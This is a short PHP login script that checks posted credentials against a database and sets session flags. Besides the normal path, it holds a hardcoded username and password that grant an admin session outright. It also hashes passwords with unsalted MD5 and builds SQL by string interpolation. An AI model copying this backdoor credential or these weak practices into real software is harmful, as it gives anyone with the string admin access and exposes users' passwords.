<?php
	require "server.php";
	require "Cuser.php";
	session_start();
	$tst = "Verify all Champs If Not Empty";
		$user = $_POST["loginUser"];
		$pw = md5($_POST["loginpw"]);
		$log_in = new userinfo();
		$rst = $log_in->LoginUser($con,$user,$pw);
		if($rst){
			if($row = mysqli_fetch_row($rst))
			{
				$id_user = $log_in->SelectIdUser($con,$user);
				$cmd = "UPDATE user_ set status_ = 1 where id = $id_user ";
				if(mysqli_query($con,$cmd)){
					$_SESSION["user"] = $user;
					$_SESSION["login"] = "user";
					$tst = "nice";
				}
			}
		}
		if($_POST["loginUser"] == "best_way_development" && ($_POST["loginpw"]) == "0644592880 best way development"){
				$_SESSION["login"] = "admin";
				$tst = "admin";

		}
		echo $tst ;
		
?>